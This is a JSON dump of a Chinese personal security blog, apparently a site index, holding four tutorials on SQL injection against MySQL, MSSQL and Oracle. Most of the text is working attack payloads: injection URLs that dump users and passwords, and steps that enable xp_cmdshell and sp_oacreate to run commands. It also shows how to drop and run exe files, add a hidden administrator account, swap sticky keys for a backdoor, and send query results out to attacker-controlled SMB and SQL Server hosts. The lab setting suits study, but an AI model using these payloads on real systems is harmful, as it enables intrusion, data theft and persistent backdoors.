{"meta":{"title":"我的小blog","subtitle":"分享自己想分享的","description":"分享生活与知识","author":"Gun97Dt","url":"http://example.com","root":"/"},"pages":[{"title":"分类","date":"2021-06-23T03:12:57.000Z","updated":"2021-06-24T03:48:49.444Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-06-23T03:05:33.000Z","updated":"2021-06-23T16:48:54.591Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"smb带外注入复现","slug":"smb带外注入复现","date":"2021-06-27T11:22:34.000Z","updated":"2021-06-27T12:28:46.396Z","comments":false,"path":"2021/06/27/smb带外注入复现/","link":"","permalink":"http://example.com/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"smb带外注入1 测试环境 centos7 mysql CentOS7上安装smb服务： 1yum install samba 然后修改smb配置文件： 1vi /etc/samba/smb.conf 修改为如下图： 12345678910111213141516旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User 日志记录级别调到10 ，level 0-10 ，调到最高便于记录： log level = 10log file = /var/log/samba/%m.log //这里配置每个连接的用户独立生成一个log文件 然后再配置一个test共享：[test] comment = Public stuff path = /usr/local/test public = yes browseable = yes guest ok = yes保存后重启 samba服务。 然后找一台windows环境的机器，上面安装MySQL ，设置读写权限：secure_file_priv=’’。 复现在MySQL服务器上执行这样一条SQL语句：会生成一个对应的log文件：路径：/var/log/samba/ select load_file(&#39;\\\\\\\\192.168.31.243\\\\smb_test\\\\1.txt&#39;);在samba服务器查看到了这样一条日志：smbd_smb2_tree_connect: couldn’t find service smb_test[2021/06/27 19:19:37.229364, 3, pid=13522, effective(0, 0), real(0, 0), class=smb2] ../../source3/smbd/smb2_server.c:3213(smbd_smb2_request_error_ex) 如果执行的共享目录存在于服务器上：select load_file(&#39;\\\\\\\\192.168.31.243\\\\test\\\\smb_test\\\\1.txt&#39;);会得到这样的日志:check_reduced_name: check_reduced_name [smb_test.sym] [/usr/local/test][2021/06/27 19:33:03.723316, 10, pid=13550, effective(99, 99), real(99, 0), class=vfs] ../../source3/smbd/vfs.c:1257(check_reduced_name) 然后使用两种方法都可以。 这里使用第一种方法来查询一下user():select load_file(concat(&#39;\\\\\\\\192.168.31.243\\\\&#39;,user(),&#39;\\\\1.txt&#39;));查看日志获取数据：smbd_smb2_tree_connect: couldn’t find service root@localhost 可以收到查询的内容了。 经过测试第二种方法会比第一种快，推荐第一种。 日志内容比较多，不便于查找，日志还需要进一步优化。不过，我们可以插入关键词进行匹配： select load_file(concat(&#39;\\\\\\\\192.168.31.243\\\\test\\\\[asd&#39;,user(),&#39;asd]\\\\1.txt&#39;)); 查看日志：open_file_ntcreate: fname=[asdroot@localhostasd].sym, dos_attrs=0x80 access_mask=0x120089 share_access=0x7 create_disposition = 0x1 create_options=0x40 unix mode=0744 oplock_request=256 private_flags = 0x0 最后，来比较一下smb外带注入与DNS外带注入。 smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。 smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。 二者都受限于windows系统以及MySQL 的secure_file_priv 。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"smb带外注入","slug":"smb带外注入","permalink":"http://example.com/tags/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/"},{"name":"注入","slug":"注入","permalink":"http://example.com/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"mssql注入突破堆叠来执行命令","slug":"mssql","date":"2021-06-25T11:31:41.000Z","updated":"2021-06-25T11:41:37.523Z","comments":false,"path":"2021/06/25/mssql/","link":"","permalink":"http://example.com/2021/06/25/mssql/","excerpt":"","text":"1、利用openrowset，适用于union和报错注入： 但是该方法在实际的运用中局限性还是很大的，因为在 mssql2005 及其以后，mssql对系统存储过程做了权限控制，Ad Hoc Distributed Queries 组件默认是不被启用的。http://192.168.31.89/sqli.php?id=-1 union select (select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) for xml path),null,null http://192.168.31.89/sqli.php?id=-1 AND (select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) FOR XML PATH(&#39;&#39;))=1 http://192.168.31.89/sqli.php?id=-1 and 1=(select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) for xml path) 2、如果能构造一个if语句则可以用：这个更好利用：几乎没限制，但前提是要知道怎么构造if语句。这里可以开启存储过程，接下来的就可以自由发挥了 1select 1 where 1=1 if 1=1 execute(&#x27;exec sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;, 1;reconfigure;exec sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;, 1;reconfigure;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;); http://192.168.31.89/sqli.php?id=-1 if 1=1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;,1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;exec xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;)可以结合创建一个表来读取命令的执行结果的方法：http://192.168.31.89/sqli.php?id=-1 if 1=1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;,1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;CREATE TABLE tmp (dir varchar(8000));insert into tmp(dir) exec xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;)","categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"mssql注入","slug":"mssql注入","permalink":"http://example.com/tags/mssql%E6%B3%A8%E5%85%A5/"}]},{"title":"sqlserver注入:执行命令和写入exe的一些方法技巧","slug":"sqlserver","date":"2021-06-25T04:55:59.000Z","updated":"2021-06-25T05:55:45.651Z","comments":false,"path":"2021/06/25/sqlserver/","link":"","permalink":"http://example.com/2021/06/25/sqlserver/","excerpt":"","text":"Mssql站库分离，sa权限注入,能正常执行命令,system权限,数据库服务器不出网，写入exe并执行命令的一些思路: 实验环境： 123web服务器：OS：win2012r2 ip:192.168.31.89(外) ip:172.16.32.28(内) php-5.4.45数据库服务器：OS:win2012r2 ip:172.16.32.25(内) sqlserver2008r2攻击机：OS:win10 ip:192.168.31.122 首先判断注入，我这里直接用sqlmap： 然后判断是否站库分离：根据结果判断是否分离，结果一样就可能站库同服务器，结果不一样就可能是站库分离： 得到客户端主机名:select host_name(); web服务器的主机名 http://192.168.31.89/sqli.php?id=-5+UNION+ALL+SELECT+host_name(),null,null--+- 得到服务端主机名: select @@servername;sqlserver服务器的主机名 http://192.168.31.89/sqli.php?id=-5+UNION+ALL+SELECT+@@servername,null,null--+- 在不出网的数据库服务器上写入exe:1、开启xp_cmdshellhttp://192.168.31.89/sqli.php?id=5 exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure; 2、写入exe:这里可以在攻击机上利用powershell或者certutil或者其他工具将exe进行base64编码或者hex编码： 用powershell将exe进行base64编码： 123PS &gt; $PEBytes = [IO.File]::ReadAllBytes(&#x27;1.exe&#x27;); PS &gt; $Base64String = [System.Convert]::ToBase64String($PEBytes); PS &gt; $Base64String | Out-File -FilePath bs64.txt 或者用certuitl将exe进行base64编码： 1Certutil –encode 1.exe 1.txt 然后利用xp_cmdshell把base64内容输出到数据库服务器上的一个txt文本，并使用certutil解码转换回exe： 可以用echo也可以用set，但是echo是有长度限制的而且还会自动分行，一般用set：因为上面的1.exe编码后的内容太多了，所以我这里只是演示一下怎么传输到服务器上而并没有把整个1.exe的内容传输进去： 123exec master..xp_cmdshell &#x27;&gt;&gt;c:\\windows\\temp\\vars.txt set /p=&quot;TVqQAAMAAAAEAAAA//8AAL&quot; &lt;nul&#x27;; exec master..xp_cmdshell &#x27;&gt;&gt;c:\\windows\\temp\\vars.txt set /p=&quot;jZlG5ukKUXlIV9QTUgdowg&quot; &lt;nul&#x27;; exec master..xp_cmdshell &#x27;&gt;&gt;c:\\windows\\temp\\vars.txt set /p=&quot;CDtIBDgCIo2ve+ZJGkABCx&quot; &lt;nul&#x27;; 然后使用certutil解码转换回exe： 1exec master..xp_cmdshell &#x27;CertUtil -decode c:\\windows\\temp\\vars.txt c:\\windows\\temp\\res.exe&#x27; 这里提一下利用certutil将exe进行base64编码和解码的过程： 需要验证解码后的exe与原来的exe的md5hash值是否一致. certutil突破上传文件大小及后缀限制：可以先本地先把exe进行base64编码：certutil -encode xxx.exe xxx.txt,然后把xxx.txt拆分成两半1.txt、2.txt，手动两个文件都补全—–BEGIN CERTIFICATE—–，—–END CERTIFICATE—–开关结尾或者把—–BEGIN CERTIFICATE—–和—–END CERTIFICATE—–删掉。总之保证生成exe再合成的md5不变. 然后上传至目标机器：然后分别解码为exe： 12certutil -decode 1.txt 1.exe certutil -decode 2.txt 2.exe 然后把两个exe合并成为一个：这里的顺序有规定：xxx.txt拆分的上半部分解码的exe+xxx.txt拆分的下半部分解码的exe，如果顺序调转则合成后的MD5会变. 1copy /B 1.exe+2.exe 3.exe 然后查看合并后的exe的MD5跟原来的exe是否一致： 12certutil -hashfile 3.exe MD5certutil -hashfile xxx.exe MD5 3.利用xp_cmdshell执行exe:http://192.168.31.89/sqli.php?id=5;exec master..xp_cmdshell &#39;c:\\test\\res.exe&#39; 执行命令：xp_cmdshell一般情况下是有回显的机子不出网没回显：一般还可以新建一个数据表，把执行结果保存在数据表里，再去查询这个表。sqlmap的os-shell就是这个原理，新建了一个sqlmapouput的表。 http://192.168.31.89/sqli.php?id=5;CREATE TABLE cmdtmp (dir varchar(8000)); 建表成功：http://192.168.31.89/sqli.php?id=-5 UNION SELECT table_name,null,null from INFORMATION_SCHEMA.TABLES 然后利用xp_cmdshell执行命令并把结果插进cmdtmp表里：http://192.168.31.89/sqli.php?id=-5;insert into cmdtmp(dir) exec master..xp_cmdshell &#39;whoami&#39; 然后查询cmdtmp表来获取结果： 1select * from cmdtmp; 也可以利用sqlserver openrowset（不需要高权限）把执行的结果转发到自己的sqlserver服务器上：不过这个只能用于目标sqlserver服务器能连上自己sqlserver服务器的情况，大概就是目标服务器出网的情况，但又没回显就可以用了适用于盲注入、出网但页面不返回信息 使用这种注入方法，需要一台带有sqlserver的机器。原理就是把当前查询的数据转发到自己远程的sqlserver上。 先自己搭好一台带有SqlServer服务器：我这里是win2012r2+mssql2008r2 172.16.32.22 然后开启目标数据库的Ad Hoc Distributed Queries： 12;exec sp_configure &#x27;show advanced options&#x27;,1 reconfigure;exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1 reconfigure 然后在自己搭好的sqlserver上建立一个临时表： 1create table ##version (VERSION varchar(500)) 查询系统信息，把查询的信息传到自己的sqlserver创建的临时表上：http://192.168.31.89/sqli.php?id=-5;insert into OPENROWSET(&#39;SQLOLEDB&#39;, &#39;server=172.16.32.22;uid=sa;pwd=1qaz@WSX&#39;, &#39;select * from %23%23version&#39; ) select DB_NAME() 然后在自己本地sqlserver上查询结果： 1select * from ##version 两边创建临时表：http://192.168.31.89/sqli.php?id=-5;create table %23%23nonamed( dir ntext, num int ) 查询路径：xp_dirtree 向nonamed表插入c盘下路径的数据:http://192.168.31.89/sqli.php?id=-5;insert %23%23nonamed execute master..xp_dirtree &#39;c:/&#39;,1 这里就是把数据转发到远程172.16.32.22 sqlserver上:http://192.168.31.89/sqli.php?id=-5;insert into OPENROWSET(&#39;SQLOLEDB&#39;, &#39;server=172.16.32.22;uid=sa;pwd=1qaz@WSX&#39;,&#39;select * from %23%23nonamed&#39;) select * from %23%23nonamed 远程sqlserver执行这个命令就可以获取数据: 1select * from ##nonamed 类似的还有opendatasource函数等函数。但用法有一点点区别。 实现功能: 获取所有库.当前库所有表.表里所有内容.分区路径.本机建立库和表,方便反弹时写进东西.insert into opendatasource(&#39;sqloledb&#39;,&#39;server=mssql服务器地址（）,端口; uid=账号;pwd=密码;database=数据库名&#39;).数据库名.dbo.表名 select * from admin 1payload：%27%20;%20insert%20into%20opendatasource(%27sqloledb%27,%27server=XX.xx.xx.xx,1433;uid=sa;pwd=xxxxxxxxx;database=test%27).test.dbo.%20test%20select%20*%20from%20admin--+ 函数外的.test.dbo.test表示连接成功后，test数据库，dbo是权限，下个test是我建的表，再后面是查询的被攻击的数据表.注意：此处需要知道admin的字段数，因为test表需要和admin表字段数一致，创建的表需要和目标表的字段数相同，或者把*换成想要的字段。 4、sp_oacreate（没有回显，可以把系统命令执行的结果echo到一个txt。暂时没研究出能不能插进表里）利用sp_oacreate进行写exe和执行命令：在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权 sp_oacreate可以删除、复制、移动文件，还能配合sp_oamethod来写文件执行cmd。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言，换言之就是xp_cmdshell能执行的sp_oacreate＋sp_oamethod同样能胜任。但是使用此方法时sp_oacreate没有回显，所以一般用于xp_cmdshell无法使用时. 开启: 12exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure; 关闭： 123exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure; 1.调用cmd 来执行命令添加用户：wscript.shell执行命令: 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c net user asd 1qaz@WSX /add&#x27; Shell.Application执行命令：没成功，命令执行了但是没结果，暂时没有研究是啥问题。 1declare @o int exec sp_oacreate &#x27;Shell.Application&#x27;, @o out exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;c:\\test.txt&#x27;,&#x27;c:\\windows\\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;; 2、写入启动项：123456789101112declare @sp_passwordxieo int, @f int, @t int, @ret intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @sp_passwordxieo outexec sp_oamethod @sp_passwordxieo, &#x27;createtextfile&#x27;, @f out, &#x27;d:\\RECYCLER\\1.vbs&#x27;, 1exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set ob=GetObject(os)&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set od=ob.Create(&quot;user&quot;,&quot;123$&quot;)&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;od.SetPassword &quot;123&quot;&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;od.SetInfo&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;Set of=GetObject(os&amp;&quot;/123$&quot;,user)&#x27;exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;oe.add os&amp;&quot;/123$&quot;&#x27;; 3、粘贴键替换123456declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\\windows\\explorer.exe&#x27; ,&#x27;c:\\windows\\system32\\sethc.exe&#x27;;declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\\windows\\system32\\sethc.exe&#x27; ,&#x27;c:\\windows\\system32\\dllcache\\sethc.exe&#x27;; 需要同时具备sp_oacreate 和sp_oamethod 两个功能组件. 删除文件12345declare @result intdeclare @fso_token intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @fso_token outexec sp_oamethod @fso_token,&#x27;deletefile&#x27;,null,&#x27;c:\\1.txt&#x27;exec sp_oadestroy @fso_token 复制文件123declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;,@o outexec sp_oamethod @o,&#x27;copyfile&#x27;,null,&#x27;c:\\1.txt&#x27;,&#x27;c:\\2.txt&#x27; 移动文件123declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;,@o outexec sp_oamethod @o,&#x27;movefile&#x27;,null,&#x27;c:\\1.txt&#x27;,&#x27;c:\\3.txt&#x27; 4、直接写入文件到对方计算机,此处的文件可以是exe, dll,等.(注,此方法不支持文件大于64KB)将这个文件转成HEX代码：我这里用一个在线转换的网站：http://www.tomeko.net/online_tools/file_to_hex.php?lang=en 然后用以下方法写入到对方计算机中： 123456789DECLARE @ObjectToken INTEXEC sp_OACreate &#x27;ADODB.Stream&#x27;, @ObjectToken OUTPUTEXEC sp_OASetProperty @ObjectToken, &#x27;Type&#x27;, 1EXEC sp_OAMethod @ObjectToken, &#x27;Open&#x27;EXEC sp_OAMethod @ObjectToken, &#x27;Write&#x27;, NULL, 0x123456(其中0x123456为HEX内容而且不能换行)EXEC sp_OAMethod @ObjectToken, &#x27;SaveToFile&#x27;, NULL, &#x27;Test.exe(文件名)&#x27;, 2EXEC sp_OAMethod @ObjectToken, &#x27;Close&#x27;EXEC sp_OADestroy @ObjectToken 写入的路径：C:\\Windows\\System32\\Test.exe写入之后, 就发挥你的办法去执行你写入的这个文件就OK了。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sqlserver注入执行命令","slug":"sqlserver注入执行命令","permalink":"http://example.com/tags/sqlserver%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"}]},{"title":"oracle注入","slug":"oracle","date":"2021-06-23T12:15:19.000Z","updated":"2021-06-25T07:52:31.619Z","comments":false,"path":"2021/06/23/oracle/","link":"","permalink":"http://example.com/2021/06/23/oracle/","excerpt":"","text":"oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库 数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。数据库名和实例名可以相同也可以不同。在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。 数据库实例名与ORACLE_SID虽 然两者都表是oracle实例，但两者是有区别的。instance_name是oracle数据库参数。而ORACLE_SID是操作系统的环境变量。 ORACLD_SID用于与操作系统交互，也就是说，从操作系统的角度访问实例名，必须通过ORACLE_SID。在winnt平 台，ORACLE_SID还需存在于注册表中。且ORACLE_SID必须与instance_name的值一致，否则，你将会收到一个错误，在unix平台，是“ORACLE not available”,在winnt平台，是“TNS:协议适配器错误”。 当前数据库下有N张表 &lt;=&gt; Oracle：当前用户下有N张表 DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。 RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。 CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构 一般oracle数据库安装成功后会创建几个默认用户’sys’、’system’、’public’等。 oracle特性Oracle 数据库的注入不同于其他数据库，如Access 和Mysql，它包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名， 如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名 Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录 oracle 支持– 类型注释，但是不支持;分隔执行多语句，oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle，另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些，语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。 oracle注入中需要注意的一些点 Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。 Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”)：例如: 1SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0 Oracle的单行注释符号是–，多行注释符号/**/。 支持的注释符––空格/**/ 判断Oracle数据库1.oracle 支持– 类型注释，但是不支持;分隔执行多语句；oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle；另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些；语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。 利用函数来判断是否oracle数据库 如：and len(‘a’)=1（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。） 也可以通过dual来判断是否为oracle ： 1and (select count(\\*) from dual)&gt;1 -- 1and (select count(\\*) from dual)&gt;0 -- http://127.0.0.1/oracle.php?id=1&#39; and (select count (*) from user_tables)&gt;0-- http://127.0.0.1/oracle.php?id=1&#39; and (select count(*) from all_objects)&gt;0-- 也可以利用：单引号双位数=正确，单引号单位数=错误 的规则。 联合注入步骤 判断闭合，和mysql一样，此处判断为单引号闭合：http://127.0.0.1/oracle.php?id=1&#39;-- 判断字段数：http://127.0.0.1/oracle.php?id=1&#39; order by 4 -- 判断联合注入：http://127.0.0.1/oracle.php?id=-1&#39; union select null,null,null,null from dual-- 判断每个字段的数据类型： 第1个字段为数字型：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,null,null,null from dual-- 继续判断第2个字段的数据类型：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,2,null,null from dual-- 结合上图可以判断出第2个字段为字符串类型：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,null,null from dual-- 然后就可以以此类推来判断后面每个字段的数据类型了，这里就不再重复了。。最终判断的结果为：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,&#39;3&#39;,&#39;4&#39; from dual-- 判断当前数据库的用户：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select sys_context(&#39;userenv&#39;,&#39;current_user&#39;) from dual),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select user from dual),null,null from dual-- 获取当前数据库的版本：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from sys.v_$version where rownum=1),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from v$version where banner like &#39;Oracle%&#39;),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select version from v$instance),null,null from dual-- 获取操作系统版本：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from v$version where banner like &#39;TNS%&#39;),null,null from dual-- 获取当前数据库名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select * from global_name),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select name from v$database),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select global_name from global_name),null,null from dual-- 获取当时数据库实例名（这里的数据库实例和数据库名是一样的，所以等同于数据库名）：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select instance_name from v$instance),null,null from dual-- 也可以逐个爆破所有的库名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1),null,null from dual-- 第二个：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1 and owner &lt;&gt;&#39;SYS&#39;),null,null from dual-- 第三个：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1 and owner &lt;&gt;&#39;SYS&#39; and owner &lt;&gt;&#39;OUTLN&#39;),null,null from dual-- 后续以此类推可以不断的去爆破，注意：库名一定要大写 一次性获取当前用户的所有表：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(table_name,&#39;~&#39;) within group(order by 1) from all_tables where owner=&#39;SYSTEM&#39;),null,null from dual-- 也可以依次逐个爆破所有表：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select table_name from user_tables where rownum=1),null,null from dual-- 第二个：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#39;LOGMNR_SESSION_EVOLVE$&#39;),null,null from dual--后续以此类推可以不断的去爆破，注意：表名一定要大写 获取指定表的字段名：一次性获取指定表的所有字段名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(column_name,&#39;:&#39;) within group(order by 1) from all_tab_columns where table_name=&#39;USERS&#39;),null,null from dual-- 也可以逐个去爆破字段名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1),null,null from dual-- 第二个字段：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1 and column_name&lt;&gt;&#39;ID&#39;),null,null from dual-- 第三个字段：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1 and column_name&lt;&gt;&#39;ID&#39; and column_name&lt;&gt;&#39;UNAME&#39;),null,null from dual-- 依次类推爆破所有的字段名，注意字段名一定要大写。 获取字段的内容：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email,&#39;\\&#39;) within group(order by 1) from users),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select null,id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email,null,null from users-- 爆一条数据：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email) within group(order by 1) from users where rownum=1),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select CONCAT(uname,pwd) FROM users where rownum=1),null,null from dual-- 在oracle数据库中，concat函数只能连接两个字符串 http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email) within group(order by 1) from users where rownum=1 and id&lt;&gt;1),null,null from dual-- oracle报错注入报错方式与mssql一样:使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可） 报错注入的常用的几个函数：utl_inaddr.get_host_name、ctxsys.drithsx.sn、XMLType、dbms_xdb_version.checkin()、bms_xdb_version.makeversioned()、dbms_xdb_version.uncheckout()、dbms_utility.sqlid_to_sqlhash()、ordsys.ord_dicom.getmappingxpath()、ctxsys.ctx_report.token_type()、utl_inaddr.get_host_address()、decode()等。 utl_inaddr.get_host_name( ) ：本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。我们传递的参数是一个sql 语句所以返回的就是语句执行的结果。 用法：utl_inaddr.get_host_name((sql语句)),11g之后，使用此函数的数据库用户需要有访问网络的权限 获取当前用户名：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name((select user from dual))-- 也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;)-- 查看版本：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name((select banner from sys.v_$version where rownum=1))-- utl_inaddr.get_host_address()函数:原理同上 用法： 1and 1=utl_inaddr.get_host_address((sql语句))-- 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_address((select user from dual))-- 同样也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_address(&#39;~&#39;||(select user from dual)||&#39;~&#39;)-- ctxsys.drithsx.sn(): 去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询的内容） 用法：ctxsys.drithsx.sn(1, (sql语句))，该函数在查询关于主题的对应关键词时，会报错显示出第二个参数的结果，这里第二个参数为sql语句，所以报错显示的结果就是sql语句执行后的结果。 